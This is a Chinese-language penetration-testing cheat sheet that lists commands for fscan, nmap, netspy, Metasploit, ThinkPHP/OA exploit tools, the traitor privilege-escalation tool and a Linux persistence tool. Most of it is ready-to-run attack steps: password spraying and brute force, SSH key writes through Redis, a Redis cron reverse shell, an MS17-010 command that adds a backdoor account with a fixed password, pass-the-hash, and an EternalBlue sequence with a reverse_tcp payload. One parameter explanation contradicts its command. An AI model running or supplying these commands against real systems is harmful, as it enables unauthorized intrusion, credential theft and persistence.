# 渗透

## 扫描

### fscan

####  一把梭

`fscan -t 150 -time 5 -h 192.168.0.0/16`

##### 参数解释

-t 150：设置扫描的线程数为150

-time 5：设置扫描的超时时间为5秒

-p service：指定扫描的服务类型为常规服务

-h 192.168.0.0/16：指定扫描的目标网络范围

#### Web服务探测

`fscan -t 100 -time 5 -wt 8 -p web -h 192.168.0.1/24`

##### 参数解释

-wt 8：设置Web服务探测的超时时间为15秒

-p web：指定扫描的服务类型为Web服务

#### 服务检测

`fscan -t 100 -time 5 -p service -nobr -noredis -np -hf ips.txt`

##### 参数解释

-noredis：不扫描Redis服务

-hf ips.txt：指定扫描的目标IP地址列表

#### 密码喷洒

`fscan -m rdp -user administrator -pwd P@ssword -hf rdp.txt`

##### 参数解释

-m rdp：指定扫描的服务类型为RDP

-user administrator：指定要尝试的用户名

-pwd P@ssword：指定要尝试的密码

#### 弱口令检测

`fscan -m ssh -hf ssh.txt`

##### 爆破参数说明

-usera string：在默认用户列表基础上添加自定义用户名

-pwda string：在默认密码列表基础上添加自定义密码

-userf string：从文件中读取用户名字典

-pwdf string：从文件中读取密码字典

#### 漏洞利用

##### Redis写公钥

`fscan -p 6379 -rf /root/.ssh/id_rsa.pub -hf redis.txt`

##### MS17-010利用

执行此命令后会生成一个用户，用户名：sysadmin 密码：'1qaz@WSX!@#4'

`fscan -h 192.168.1.1 -m ms17010 -sc add`

#### 内网扫描

```shell
fscan.exe -h 192.168.1.1/24 -nobr -nopoc (不进行爆破,不扫Web poc,以减少流量)
fscan.exe -h 192.168.1.1/24 -pa 3389 (在原基础上,加入3389->rdp扫描)
fscan.exe -h 192.168.1.1/24 -np -no -nopoc(跳过存活检测 、不保存文件、跳过web poc扫描)
fscan.exe -h 192.168.1.1/24 -rf id_rsa.pub (redis 写公钥)
fscan.exe -h 192.168.1.1/24 -rs 192.168.1.1:6666 (redis 计划任务反弹shell)
fscan.exe -hf ip.txt  (以文件导入)
fscan.exe -h 192.168.1.1/24 -c whoami (ssh 爆破成功后，命令执行)
fscan.exe -h 192.168.1.1/24 -m ssh -p 2222 (指定模块ssh和端口)
fscan.exe -h 192.168.1.1/24 -pwdf pwd.txt -userf users.txt (加载指定文件的用户名、密码来进行爆破)
fscan.exe -h 192.168.1.1/24 -o /tmp/1.txt (指定扫描结果保存路径,默认保存在当前路径) 
fscan.exe -h 192.168.1.1/8  (A段的192.x.x.1和192.x.x.254,方便快速查看网段信息 )
fscan.exe -h 192.168.1.1/24 -m smb -pwd password (smb密码碰撞)
fscan.exe -h 192.168.1.1/24 -m ms17010 (指定模块)
fscan.exe -u http://baidu.com -proxy 8080 (扫描单个url,并设置http代理 http://127.0.0.1:8080)
fscan.exe -h 192.168.1.1/24 -socks5 127.0.0.1:1080 (只支持简单tcp功能的代理,部分功能的库不支持设置代理)
fscan.exe -h 192.168.1.1/24 -m ms17010 -sc add (内置添加用户等功能,只适用于备选工具,更推荐其他ms17010的专项利用工具)
fscan.exe -h 192.168.1.1/24 -m smb2 -user admin -hash xxxxx (pth hash碰撞,xxxx:ntlmhash,如32ed87bdb5fdc5e9cba88547376818d4)
fscan.exe -h 192.168.1.1/24 -m wmiexec -user admin -pwd password -c xxxxx (wmiexec无回显命令执行)
```

### nmap

```
nmap 192.168.31.180 -p 80
nmap 192.168.31.180 -p 1-80
nmap 192.168.31.180 -p 80,3389,22,21
nmap 192.168.31.180 -p 1-65535
```

使用 `-sT` 参数进行TCP全连接扫描。

使用 `-sS` 参数进行SYN半链接扫描。

### netspy

内网扫描工具

#### 使用

1. 查看帮助信息

   ```
   netspy -h
   ```

2. 使用icmpspy模块进行探测

   使用icmpspy模块进行自动探测，自动探测网段为："192.168.0.0/16", "172.16.0.0/12", "10.0.0.0/8"。

   ```
   netspy is
   ```

   注：当没有权限发送icmp包时可以尝试使用pingspy模块。

3. 使用arpspy模块进行探测

   指定使用eth0网络接口进行arp协议探测，探测网段为192.168.0.0/16和59.192.0.0/10。

   ```
   netspy -c 192.168.0.0/16 -c 59.192.0.0/10 as -i eth0 
   ```

4. 使用tcpspy模块进行探测

   ```
   netspy ts -p 22 -p 3389
   ```

   注：如果不指定-p参数，netspy默认探测21, 22, 23, 80, 135, 139, 443, 445, 3389, 8080端口。

5. 使用udpspy模块进行探测

   ```
   netspy us -p 53 -p 137
   ```

   注：如果不指定-p参数，netspy默认探测53, 123, 137, 161, 520, 523, 1645, 1701, 1900, 5353端口。

6. 使用icmpspy模块强制进行段内所有IP存活探测

   ```
   netspy -c 192.168.91.0/24 -r 255 -f is
   ```

7. 使用icmpspy模块急速探测模式

   ```
    netspy -x is
   ```

   注：急速模式协程数量为cpu核数*40，只探测段内网关。

### searchall

内网敏感信息扫描工具



## 攻击

### ThinPHP 综合利用工具

ThinkPHP一把梭工具

jdk1.8

### Metasploit

````shell
msfconsole										    #进入框架
search  ms17_010                                    # 使用search命令查找相关漏洞
use exploit/windows/smb/ms17_010_eternalblue        # 使用use进入模块
info     										    #使用info查看模块信息
set payload windows/x64/meterpreter/reverse_tcp    	#设置攻击载荷
show options    									#查看模块需要配置的参数
set  RHOST  192.168.100.158    					    #设置参数
exploit / run     								    #攻击
````

### hyacinth

java漏洞检测利用工具

包含Struts2、Fastjson、Weblogic（xml）、Shiro、Log4j、Jboss、SpringCloud、等漏洞检测利用模块，及免杀webshell生成模块 Bypass

### OA-EXPTOOL

OA综合利用工具，集合将近20款OA漏洞批量扫描

### Aazhen-RexHa

支持扫描的漏洞分别是： ThinkPHP-2.x-RCE， ThinkPHP-5.0.23-RCE， ThinkPHP5.0.x-5.0.23通杀RCE， ThinkPHP5-SQL注入&敏感信息泄露， ThinkPHP 3.x 日志泄露NO.1， ThinkPHP 3.x 日志泄露NO.2， ThinkPHP 5.x 数据库信息泄露的漏洞检测，以及批量检测的功能。漏洞POC基本适用ThinkPHP全版本漏洞。

```
java -javaagent:rexha.jar -jar rexha.jar
```

jdk版本要求18

## 代理

### gost

命令实例可以查看目录中的README

## 提权

### traitor

- Nearly all of [GTFOBins](https://gtfobins.github.io/)
- Writeable docker.sock
- CVE-2022-0847 (Dirty pipe)
- CVE-2021-4034 (pwnkit)
- CVE-2021-3560\

#### Usage

Run with no arguments to find potential vulnerabilities/misconfigurations which could allow privilege escalation. Add the `-p` flag if the current user password is known. The password will be requested if it's needed to analyse sudo permissions etc.

```
traitor -p
```

Run with the `-a`/`--any` flag to find potential vulnerabilities, attempting to exploit each, stopping if a root shell is gained. Again, add the `-p` flag if the current user password is known.

```
traitor -a -p
```

Run with the `-e`/`--exploit` flag to attempt to exploit a specific vulnerability and gain a root shell.

```
traitor -p -e docker:writable-socket
```

exp list

```
docker:writable-socket
polkit:CVE-2021-3560
polkit:CVE-2021-4034
kernel:CVE-2022-0847
gtfobins:apt-get
gtfobins:apt
gtfobins:ash
gtfobins:awk
gtfobins:bash
gtfobins:bundler
gtfobins:busctl
gtfobins:busybox
gtfobins:byebug
gtfobins:capsh
gtfobins:check_by_ssh
gtfobins:check_cups
gtfobins:cowsay
gtfobins:cowthink
gtfobins:cpan
gtfobins:cpulimit
gtfobins:crash
gtfobins:csh
gtfobins:dash
gtfobins:dmesg
gtfobins:dpkg
gtfobins:eb
gtfobins:ed
gtfobins:emacs
gtfobins:env
gtfobins:ex
gtfobins:expect
gtfobins:find
gtfobins:flock
gtfobins:ftp
gtfobins:gawk
gtfobins:gcc
gtfobins:gdb
gtfobins:gem
gtfobins:ghc
gtfobins:ghci
gtfobins:gimp
gtfobins:git
gtfobins:gtester
gtfobins:hping3
gtfobins:iftop
gtfobins:ionice
gtfobins:irb
gtfobins:journalctl
gtfobins:jrunscript
gtfobins:ksh
gtfobins:less
gtfobins:logsave
gtfobins:ltrace
gtfobins:lua
gtfobins:mail
gtfobins:make
gtfobins:man
gtfobins:mawk
gtfobins:more
gtfobins:mysql
gtfobins:nano
gtfobins:nawk
gtfobins:nice
gtfobins:nmap
gtfobins:node
gtfobins:nohup
gtfobins:nsenter
gtfobins:pdb
gtfobins:perl
gtfobins:pg
gtfobins:php
gtfobins:pic
gtfobins:pico
gtfobins:pry
gtfobins:psql
gtfobins:puppet
gtfobins:python
gtfobins:rake
gtfobins:rlwrap
gtfobins:rpm
gtfobins:rpmquery
gtfobins:rsync
gtfobins:ruby
gtfobins:run-mailcap
gtfobins:run-parts
gtfobins:rview
gtfobins:rvim
gtfobins:scp
gtfobins:screen
gtfobins:script
gtfobins:sed
gtfobins:service
gtfobins:setarch
gtfobins:sftp
gtfobins:slsh
gtfobins:socat
gtfobins:split
gtfobins:sqlite3
gtfobins:ssh
gtfobins:start-stop-daemon
gtfobins:stdbuf
gtfobins:strace
gtfobins:tar
gtfobins:taskset
gtfobins:tclsh
gtfobins:time
gtfobins:timeout
gtfobins:tmux
gtfobins:unshare
gtfobins:valgrind
gtfobins:vi
gtfobins:vim
gtfobins:vimdiff
gtfobins:watch
gtfobins:wish
gtfobins:xargs
gtfobins:zip
gtfobins:zsh
```

## 权限维持/后渗透

### CACM

​	一款Linux权限维持+后渗透的工具，功能：端口扫描，敏感信息，指纹识别，IP伪装，键盘监控，进程隐藏，内容搜索，文件搜索，下载工具，edr/av识别，权限维持，docker敏感信息扫描，ssh连接伪装等多个功能。

